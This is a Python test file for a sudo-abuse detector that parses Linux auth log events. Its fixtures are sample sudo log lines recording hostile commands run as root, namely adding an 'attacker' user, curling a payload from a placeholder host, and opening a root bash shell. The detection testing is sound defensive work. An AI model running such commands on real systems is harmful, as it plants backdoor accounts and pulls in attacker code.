from src.detection.linux.sudo_abuse_detector import (
    detect_sudo_abuse,
)
from src.models.linux_event import LinuxEvent


def create_sudo_event(
    message: str,
    user: str = "alex",
    hostname: str = "ubuntu-server",
) -> LinuxEvent:
    return LinuxEvent(
        timestamp="Jul  7 09:15:01",
        hostname=hostname,
        service="sudo",
        process="sudo",
        user=user,
        message=message,
        action="command",
        status="success",
    )


def test_detect_sudo_useradd_activity():
    events = [
        create_sudo_event(
            "alex : TTY=pts/0 ; PWD=/home/alex ; "
            "USER=root ; COMMAND=/usr/sbin/useradd attacker"
        )
    ]

    findings = detect_sudo_abuse(events)

    assert len(findings) == 1
    assert findings[0].title == "Sudo Abuse Detected"
    assert findings[0].severity == "high"
    assert findings[0].hostname == "ubuntu-server"


def test_detect_sudo_download_command():
    events = [
        create_sudo_event(
            "alex : TTY=pts/0 ; PWD=/tmp ; "
            "USER=root ; COMMAND=/usr/bin/curl "
            "http://example.test/payload"
        )
    ]

    findings = detect_sudo_abuse(events)

    assert len(findings) == 1
    assert findings[0].title == "Sudo Abuse Detected"


def test_detect_sudo_shell_execution():
    events = [
        create_sudo_event(
            "alex : TTY=pts/0 ; PWD=/home/alex ; "
            "USER=root ; COMMAND=/bin/bash"
        )
    ]

    findings = detect_sudo_abuse(events)

    assert len(findings) == 1


def test_ignore_normal_sudo_command():
    events = [
        create_sudo_event(
            "alex : TTY=pts/0 ; PWD=/home/alex ; "
            "USER=root ; COMMAND=/usr/bin/apt update"
        )
    ]

    findings = detect_sudo_abuse(events)

    assert findings == []


def test_ignore_non_sudo_event():
    events = [
        LinuxEvent(
            service="ssh",
            message="useradd attacker",
            action="authentication",
            status="failed",
        )
    ]

    findings = detect_sudo_abuse(events)

    assert findings == []


def test_deduplicate_identical_sudo_events():
    message = (
        "alex : TTY=pts/0 ; PWD=/home/alex ; "
        "USER=root ; COMMAND=/usr/sbin/useradd attacker"
    )

    events = [
        create_sudo_event(message),
        create_sudo_event(message),
    ]

    findings = detect_sudo_abuse(events)

    assert len(findings) == 1


def test_sudo_finding_preserves_normalized_utc_time():
    event = create_sudo_event(
        "alex : USER=root ; COMMAND=/usr/sbin/useradd attacker"
    )
    event.timestamp_utc = "2026-07-07T06:15:01.123456789+00:00"

    findings = detect_sudo_abuse([event])

    assert len(findings) == 1

    finding = findings[0]

    assert finding.first_seen == (
        "2026-07-07T06:15:01.123456789+00:00"
    )
    assert finding.last_seen == (
        "2026-07-07T06:15:01.123456789+00:00"
    )

    assert event.timestamp == "Jul  7 09:15:01"


def test_sudo_deduplicated_finding_preserves_time_range():
    message = (
        "alex : USER=root ; COMMAND=/usr/sbin/useradd attacker"
    )

    later_event = create_sudo_event(message)
    later_event.timestamp_utc = (
        "2026-07-07T06:15:01.100000001+00:00"
    )

    earlier_event = create_sudo_event(message)
    earlier_event.timestamp_utc = (
        "2026-07-07T06:15:01.1+00:00"
    )

    # Events deliberately arrive out of chronological order.
    findings = detect_sudo_abuse(
        [later_event, earlier_event]
    )

    assert len(findings) == 1

    finding = findings[0]

    assert finding.first_seen == (
        "2026-07-07T06:15:01.1+00:00"
    )
    assert finding.last_seen == (
        "2026-07-07T06:15:01.100000001+00:00"
    )


def test_sudo_deduplicated_finding_rejects_incomplete_time():
    message = (
        "alex : USER=root ; COMMAND=/usr/sbin/useradd attacker"
    )

    valid_event = create_sudo_event(message)
    valid_event.timestamp_utc = (
        "2026-07-07T06:15:01+00:00"
    )

    unknown_event = create_sudo_event(message)
    unknown_event.timestamp_utc = None

    findings = detect_sudo_abuse(
        [valid_event, unknown_event]
    )

    assert len(findings) == 1

    finding = findings[0]

    assert finding.first_seen is None
    assert finding.last_seen is None
